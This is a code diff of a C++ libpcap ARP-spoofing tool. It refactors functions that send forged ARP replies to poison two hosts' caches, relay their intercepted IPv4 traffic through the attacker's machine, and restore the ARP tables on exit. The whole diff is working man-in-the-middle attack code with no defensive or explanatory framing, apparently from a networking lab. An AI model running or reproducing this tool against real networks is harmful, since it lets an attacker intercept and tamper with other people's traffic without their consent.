@@ -12,6 +12,7 @@
 #include <arpa/inet.h>
 #include <net/if_arp.h>
 #include <unistd.h>
+#include <signal.h>
 
 #include "pcap.h"
 #include "../../include/mac.h"
@@ -22,7 +23,7 @@
 
 #define TICK_TIME           50000
 #define MAX_MTU             1500
-#define MAX_MSS             1400//1460
+#define MAX_MSS             1400
 #define UDP_HEADER_SIZE     8
 #define PSEUDO_HDR_SIZE     96
 
@@ -51,11 +52,13 @@ struct Packet {
     u_char* buf;
 };
 
+void signalHandler(int signal);
 void usage();
 bool parse(int argc);
 list<Flow> GetFlowList(int argc, char* argv[]);
 bool GetArpTable(const string interface, const list<Flow>& flowList, map<Ip, Mac>& arpTable);
-Mac GetInterfaceMac(string interface);
+Mac GetInterfaceMac(const string& interface);
+Ip GetInterfaceIp(const string& interface);
 Mac ResolveMac(const string interface, const Ip ip);
 pcap_t* OpenPcap(const string Interface);
 bool SetPcapFilter(pcap_t* pcap, string filterExpression);
@@ -63,112 +66,96 @@ bool SendPacket(pcap_t* pcap, uint8_t* data,const int size);
 Packet ReadPacket(pcap_t* pcap);
 void SetIpChecksum(PIpHdr ipHeader);
 void SetTcpChecksum(const uint16_t payloadLen, const PIpHdr ipHeader, PTcpHdr tcpHeader);
+EthArpPacket MakeEthArpPacket(const Mac& ethSmac, const Mac& ethDmac, const Mac& arpSmac, const Mac& arpTmac, const Ip& arpSip, const Ip& arpTip, const ArpHdr::OpCodeType opCode);
 void JumboPacketProcessing(pcap_t* pcap, const Packet& jPacket);
 void JumboFrameTcpProcessing(pcap_t* pcap, const Packet& jPacket);
 //bool Infect(pcap_t* pcap, const Mac& attackerMac, const Flow& flow, const Mac& targetMac);
-bool Infect(pcap_t* pcap, const Mac& attackerMac, const Mac& targetMac, const Ip& senderIP, const Ip& targetIP);
-bool Recover(pcap_t* pcap, list<Flow>& flowList, map<Ip, Mac>& arpTable);
+bool Infect(pcap_t* pcap, const Mac& attackerMac, const Mac& targetMac, const Ip& senderIP, const Ip& targetIP, const ArpHdr::OpCodeType opCode = ArpHdr::OpCodeType::Arp_Reply);
+//bool Recover(pcap_t* pcap, list<Flow>& flowList, map<Ip, Mac>& arpTable);
+bool Recover(pcap_t* pcap, const Mac& attackerMac, const Mac& senderMac, const Mac& targetMac, const Ip& senderIP, const Ip& targetIP, const ArpHdr::OpCodeType opCode = ArpHdr::OpCodeType::Arp_Reply);
+void Relay(pcap_t* pcap, Packet& rPacket, list<Flow>& flowList, map<Ip, Mac>& arpTable);
 
 
-Ip g_myIp(string("192.168.0.106"));
 Ip g_hostIp(string("192.168.0.100"));
 Ip g_netMask(string("255.255.255.0"));
+
+Mac g_attackMac;
+Ip g_attackIp;
+list<Flow>* g_flowListPtr;
+map<Ip, Mac>* g_arpTablePtr;
+pcap* g_pcap;
 
 int main(int argc, char* argv[])
 {
     try {
+        signal(SIGINT, signalHandler);
+        signal(SIGTERM, signalHandler);
+
         if(!parse(argc)) throw runtime_error("Failed to parse");
 
         string interface(argv[1]);
 
         Mac attackMac = GetInterfaceMac(interface);
+        if(attackMac.isNull()) throw runtime_error("Failed to get interface mac");
+        g_attackMac = attackMac;
+
+        Ip attackIp = GetInterfaceIp(interface);
+        if(attackIp.isEmtpy()) throw runtime_error("Failed to get interface ip");
+        g_attackIp = attackIp;
 
         list<Flow> flowList = GetFlowList(argc, argv);
         if(flowList.empty()) throw runtime_error("Failed to get flow list");
+        g_flowListPtr = &flowList;
 
         map<Ip, Mac> arpTable{};
         if(!GetArpTable(interface, flowList, arpTable)) throw runtime_error("Failed to get arp table");
+        //if(!arpTable.count(attackIp)) arpTable[attackIp] = attackMac;
+        g_arpTablePtr = &arpTable;
 
         pcap_t* pcap = OpenPcap(interface);
         if(pcap == NULL) throw runtime_error("Failed to open pcap");
+        g_pcap = pcap;
 
         //packet trace speed
         string filterExp = "not host " + string(g_hostIp);
 
         if(!SetPcapFilter(pcap, filterExp)) throw runtime_error("Failed to set filter");
 
-        int currentTime = -TICK_TIME;
+        int currentTime = clock()-TICK_TIME;
         Packet rPacket;
 
         do {
             if((clock() - currentTime) > TICK_TIME) {
                 currentTime = clock();
 
-                for(Flow& f : flowList)
-                    if(!Infect(pcap, attackMac, arpTable[f.tip_], f.sip_, f.tip_)) throw runtime_error("Failed to infect");
+                for(Flow& f : flowList) if(!Infect(pcap, attackMac, arpTable[f.tip_], f.sip_, f.tip_)) throw runtime_error("Failed to infect");
             }
 
             //while
             rPacket = ReadPacket(pcap);
-
-            PEthHdr etherHeader = reinterpret_cast<PEthHdr>(rPacket.buf);
-            PArpHdr arpHeader = reinterpret_cast<PArpHdr>(rPacket.buf + sizeof(EthHdr));
-            PIpHdr ipHeader = reinterpret_cast<PIpHdr>(rPacket.buf + sizeof(EthHdr));
-            //PTcpHdr tcpHeader = reinterpret_cast<PTcpHdr>(rPacket.buf + sizeof(EthHdr) + ipHeader->len());
-
-            for(const Flow& f : flowList) {
-                //arp
-                //sender -> target
-                if(etherHeader->type() == EthHdr::Arp && (ntohl(arpHeader->sip_) == f.sip_ && ntohl(arpHeader->tip_) == f.tip_)) {
-                    if(!Infect(pcap, attackMac, arpTable[f.tip_], f.sip_, f.tip_)) {
-                        cout<<"Failed to infect \n";
-                    }
-                    break;
-                }
-
-                //icmp
-                //tcp
-                //udp
-                //sender -> target
-                if(etherHeader->type() == EthHdr::Ip4 && (ntohl(ipHeader->sip_) == f.sip_ && ntohl(ipHeader->dip_) != g_myIp)) {
-                    etherHeader->smac_ = attackMac;
-                    etherHeader->dmac_ = arpTable[f.tip_];
-
-                    //udp, icmp ... -> auto ip fragment ex) caplen : 4000, ip header : 1500
-                    if(rPacket.header->len > MAX_MTU)
-                        //JumboPacketProcessing(pcap, rPacket);
-                        JumboFrameTcpProcessing(pcap, rPacket);
-                    else
-                        if(!SendPacket(pcap, rPacket.buf, rPacket.header->caplen)) cout<<"Single"<<endl;
-
-                    break;
-                }
-
-                //target -> sender
-                if(etherHeader->type() == EthHdr::Ip4 && (ntohl(ipHeader->dip_) == f.sip_ && ntohl(ipHeader->dip_) != g_myIp)) {
-                    etherHeader->smac_ = attackMac;
-                    //etherHeader->dmac_ = arpTable[f.tip_];
-                    etherHeader->dmac_ = arpTable[f.sip_];
-
-                    //udp, icmp ... -> auto ip fragment ex) caplen : 4000, ip header : 1500
-                    if(rPacket.header->len > MAX_MTU)
-                        //JumboPacketProcessing(pcap, rPacket);
-                        JumboFrameTcpProcessing(pcap, rPacket);
-                    else
-                        if(!SendPacket(pcap, rPacket.buf, rPacket.header->caplen)) cout<<"Single"<<endl;
-
-                    break;
-                }
-            }
+            Relay(pcap, rPacket, flowList, arpTable);
         }while(true);
 
-        Recover(pcap, flowList, arpTable);
+        for(const auto& f : flowList) Recover(g_pcap, attackMac, arpTable[f.sip_], arpTable[f.tip_], f.sip_, f.tip_);
         pcap_close(pcap);
 
     }catch(const exception& e) {
         cerr<<"[main] "<<e.what()<<endl;
         return -1;
     }
+}
+
+void signalHandler(int signal) {
+    if(g_pcap == NULL) exit(0);
+    if(g_flowListPtr == nullptr || g_arpTablePtr== nullptr) exit(0);
+
+    auto& arpTable = *g_arpTablePtr;
+    auto& flowList = *g_flowListPtr;
+    for(const auto& f : flowList) Recover(g_pcap, g_attackMac, arpTable[f.sip_], arpTable[f.tip_], f.sip_, f.tip_);
+
+    pcap_close(g_pcap);
+
+    exit(0);
 }
 
 void usage() {
@@ -222,7 +209,7 @@ bool GetArpTable(const string interface, const list<Flow>& flowList, map<Ip, Mac
     return true;
 }
 
-Mac GetInterfaceMac(const string interface) {
+Mac GetInterfaceMac(const string& interface) {
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
     Mac ret{};
 
@@ -238,6 +225,34 @@ Mac GetInterfaceMac(const string interface) {
             throw runtime_error("Failed to set ioctl");
 
         ret = reinterpret_cast<u_char*>(ifr.ifr_ifru.ifru_hwaddr.sa_data);
+    }
+    catch(const exception& e) {
+        cerr<<"GetInterfaceMac : "<<e.what() <<endl;
+        cerr<<"Error : "<< errno <<" (" << strerror(errno)<<")"<<endl;
+    }
+
+    close(sock);
+
+    return ret;
+}
+
+Ip GetInterfaceIp(const string& interface) {
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+
+    Ip ret{};
+
+    ifreq ifr{};
+
+    strncpy(ifr.ifr_ifrn.ifrn_name, interface.c_str(), IFNAMSIZ - 1);
+
+    try {
+        if(sock < 0)
+            throw runtime_error("Failed to creat socket");
+
+        if(ioctl(sock, SIOCGIFADDR, &ifr) == -1)
+            throw runtime_error("Failed to set ioctl");
+
+        memcpy(&ret, ifr.ifr_ifru.ifru_addr.sa_data, sizeof(Ip));
     }
     catch(const exception& e) {
         cerr<<"GetInterfaceMac : "<<e.what() <<endl;
@@ -292,6 +307,7 @@ pcap_t* OpenPcap(const string interface) {
 
     return pcap;
 }
+
 bool SetPcapFilter(pcap_t* pcap, string filterExpression) {
     bpf_program bp{};
 
@@ -310,7 +326,7 @@ bool SetPcapFilter(pcap_t* pcap, string filterExpression) {
 bool SendPacket(pcap_t* pcap, uint8_t* data, const int size) {
     if(pcap_sendpacket(pcap, reinterpret_cast<u_char*>(data), size) == -1) {
         cerr<<"[SendPacket] "<<"Failed to send packet "<<endl;
-        cerr<<"ERROR : "<<pcap_geterr(pcap)<<endl;
+        cerr<<"ERROR : "<<string(pcap_geterr(pcap))<<endl;
         return false;
     }
 
@@ -436,7 +452,7 @@ void JumboFrameTcpProcessing(pcap_t* pcap, const Packet& jPacket) {
 
     while(tcpPayloadSize) {
         sendBytes = tcpPayloadSize > MAX_MSS ? MAX_MSS : tcpPayloadSize;
-        unique_ptr<uint8_t> segmentPacket(new uint8_t[MAX_MSS + totalHeaderLen]);
+        unique_ptr<uint8_t[]> segmentPacket(new uint8_t[MAX_MSS + totalHeaderLen]);
 
         //header
         memcpy(segmentPacket.get(), jPacket.buf, totalHeaderLen);
@@ -460,47 +476,155 @@ void JumboFrameTcpProcessing(pcap_t* pcap, const Packet& jPacket) {
         sendedBytes += sendBytes;
         tcpPayloadSize -= sendBytes;
 
-        if(!SendPacket(pcap, segmentPacket.get(), totalHeaderLen + sendBytes)) {
-            cout<<"jumbo"<<endl;
-        }
+        SendPacket(pcap, segmentPacket.get(), totalHeaderLen + sendBytes);
     }
 }
 
 //bool Infect(pcap_t* pcap, const Mac& attackerMac, const Flow& flow, const Mac& targetMac) {
-bool Infect(pcap_t* pcap, const Mac& attackerMac, const Mac& targetMac, const Ip& senderIP, const Ip& targetIP) {
+
+EthArpPacket MakeEthArpPacket(const Mac& ethSmac, const Mac& ethDmac, const Mac& arpSmac, const Mac& arpTmac, const Ip& arpSip, const Ip& arpTip, const ArpHdr::OpCodeType opCode) {
+    EthArpPacket packet{};
+
+    packet.eth_.dmac_ = ethDmac;
+    packet.arp_.tmac_ = arpTmac;
+
+    packet.eth_.smac_ = ethSmac;
+    packet.arp_.smac_ = arpSmac;
+
+    packet.eth_.type_ = htons(EthHdr::Arp);
+    packet.arp_.harwareType_ = htons(ArpHdr::ETHERNET);
+    packet.arp_.protocolType_ = htons(EthHdr::Ip4);
+    packet.arp_.hardwareSize_ = ArpHdr::ETHERNET_LEN;
+    packet.arp_.protocolSize_ = ArpHdr::PROTOCOL_LEN;
+    packet.arp_.opCode_ = htons(opCode);
+
+    packet.arp_.sip_ = htonl(arpSip);
+    packet.arp_.tip_ = htonl(arpTip);
+
+    return packet;
+}
+
+bool Infect(pcap_t* pcap, const Mac& attackerMac, const Mac& targetMac, const Ip& senderIP, const Ip& targetIP, const ArpHdr::OpCodeType opCode) {
     try {
         if(targetMac.isNull()) throw runtime_error("target mac is null");
 
-        EthArpPacket packet{};
+        EthArpPacket packet = MakeEthArpPacket(attackerMac, targetMac, attackerMac, targetMac, senderIP, targetIP, opCode);
+        //EthArpPacket packet{};
 
-        packet.eth_.dmac_ = targetMac;
-        packet.arp_.tmac_ = targetMac;
+        // packet.eth_.dmac_ = targetMac;
+        // packet.arp_.tmac_ = targetMac;
 
-        packet.eth_.smac_ = attackerMac;
-        packet.arp_.smac_ = attackerMac;
+        // packet.eth_.smac_ = attackerMac;
+        // packet.arp_.smac_ = attackerMac;
 
-        packet.eth_.type_ = htons(EthHdr::Arp);
-        packet.arp_.harwareType_ = htons(ArpHdr::ETHERNET);
-        packet.arp_.protocolType_ = htons(EthHdr::Ip4);
-        packet.arp_.hardwareSize_ = ArpHdr::ETHERNET_LEN;
-        packet.arp_.protocolSize_ = ArpHdr::PROTOCOL_LEN;
-        packet.arp_.opCode_ = htons(ArpHdr::OpCodeType::Arp_Reply);
+        // packet.eth_.type_ = htons(EthHdr::Arp);
+        // packet.arp_.harwareType_ = htons(ArpHdr::ETHERNET);
+        // packet.arp_.protocolType_ = htons(EthHdr::Ip4);
+        // packet.arp_.hardwareSize_ = ArpHdr::ETHERNET_LEN;
+        // packet.arp_.protocolSize_ = ArpHdr::PROTOCOL_LEN;
+        // packet.arp_.opCode_ = htons(opCode);
 
-        packet.arp_.sip_ = htonl(senderIP);
-        packet.arp_.tip_ = htonl(targetIP);
+        // packet.arp_.sip_ = htonl(senderIP);
+        // packet.arp_.tip_ = htonl(targetIP);
 
         SendPacket(pcap, reinterpret_cast<uint8_t*>(&packet), sizeof(EthArpPacket));
 
     }catch(const std::exception& e) {
-        cerr<<"Failed to infect : "<<e.what()<<endl;
+        cerr<<"[Infect] "<<e.what()<<endl;
         return false;
     }
     return true;
 }
 
-bool Recover(pcap_t* pcap, list<Flow>& flowList, map<Ip, Mac>& arpTable) {
-    for(Flow& f : flowList)
-        if(!Infect(pcap, arpTable[f.sip_], arpTable[f.tip_], f.sip_, f.tip_)) return false;
+bool Recover(pcap_t* pcap, const Mac& attackerMac, const Mac& senderMac, const Mac& targetMac, const Ip& senderIP, const Ip& targetIP, const ArpHdr::OpCodeType opCode) {
+    try {
+        if(targetMac.isNull()) throw runtime_error("target mac is null");
 
+        EthArpPacket packet = MakeEthArpPacket(attackerMac, targetMac, senderMac, targetMac, senderIP, targetIP, opCode);
+
+        // EthArpPacket packet{};
+
+        // packet.eth_.dmac_ = targetMac;
+        // packet.arp_.tmac_ = targetMac;
+
+        // packet.eth_.smac_ = attackerMac;
+        // packet.arp_.smac_ = senderMac;
+
+        // packet.eth_.type_ = htons(EthHdr::Arp);
+        // packet.arp_.harwareType_ = htons(ArpHdr::ETHERNET);
+        // packet.arp_.protocolType_ = htons(EthHdr::Ip4);
+        // packet.arp_.hardwareSize_ = ArpHdr::ETHERNET_LEN;
+        // packet.arp_.protocolSize_ = ArpHdr::PROTOCOL_LEN;
+        // packet.arp_.opCode_ = htons(opCode);
+
+        // packet.arp_.sip_ = htonl(senderIP);
+        // packet.arp_.tip_ = htonl(targetIP);
+
+        SendPacket(pcap, reinterpret_cast<uint8_t*>(&packet), sizeof(EthArpPacket));
+
+    }catch(const std::exception& e) {
+        cerr<<"[Recover] "<<e.what()<<endl;
+        return false;
+    }
     return true;
+}
+
+
+// bool Recover(pcap_t* pcap, list<Flow>& flowList, map<Ip, Mac>& arpTable) {
+//     for(Flow& f : flowList)
+//         if(!Infect(pcap, arpTable[f.sip_], arpTable[f.tip_], f.sip_, f.tip_, ArpHdr::Arp_Request)) return false;
+
+//     return true;
+// }
+
+void Relay(pcap_t* pcap, Packet& rPacket, list<Flow>& flowList, map<Ip, Mac>& arpTable) {
+    PEthHdr etherHeader = reinterpret_cast<PEthHdr>(rPacket.buf);
+    PArpHdr arpHeader = reinterpret_cast<PArpHdr>(rPacket.buf + sizeof(EthHdr));
+    PIpHdr ipHeader = reinterpret_cast<PIpHdr>(rPacket.buf + sizeof(EthHdr));
+    //PTcpHdr tcpHeader = reinterpret_cast<PTcpHdr>(rPacket.buf + sizeof(EthHdr) + ipHeader->len());
+
+    for(const Flow& f : flowList) {
+        //arp
+        //sender -> target
+        if(etherHeader->type() == EthHdr::Arp && (ntohl(arpHeader->sip_) == f.sip_ && ntohl(arpHeader->tip_) == f.tip_)) {
+            if(!Infect(pcap, g_attackMac, arpTable[f.tip_], f.sip_, f.tip_)) {
+                cout<<"Failed to infect \n";
+            }
+            break;
+        }
+
+        //icmp
+        //tcp
+        //udp
+        //sender -> target
+        if(etherHeader->type() == EthHdr::Ip4 && (ntohl(ipHeader->sip_) == f.sip_ && ntohl(ipHeader->dip_) != g_attackIp)) {
+            etherHeader->smac_ = g_attackMac;
+            etherHeader->dmac_ = arpTable[f.tip_];
+
+            //udp, icmp ... -> auto ip fragment ex) caplen : 4000, ip header : 1500
+            if(rPacket.header->len > MAX_MTU)
+                //JumboPacketProcessing(pcap, rPacket);
+                JumboFrameTcpProcessing(pcap, rPacket);
+            else
+                SendPacket(pcap, rPacket.buf, rPacket.header->caplen);
+
+            break;
+        }
+
+        //target -> sender
+        if(etherHeader->type() == EthHdr::Ip4 && (ntohl(ipHeader->dip_) == f.sip_ && ntohl(ipHeader->dip_) != g_attackIp)) {
+            etherHeader->smac_ = g_attackMac;
+            //etherHeader->dmac_ = arpTable[f.tip_];
+            etherHeader->dmac_ = arpTable[f.sip_];
+
+            //udp, icmp ... -> auto ip fragment ex) caplen : 4000, ip header : 1500
+            if(rPacket.header->len > MAX_MTU)
+                //JumboPacketProcessing(pcap, rPacket);
+                JumboFrameTcpProcessing(pcap, rPacket);
+            else
+                SendPacket(pcap, rPacket.buf, rPacket.header->caplen);
+
+            break;
+        }
+    }
 }
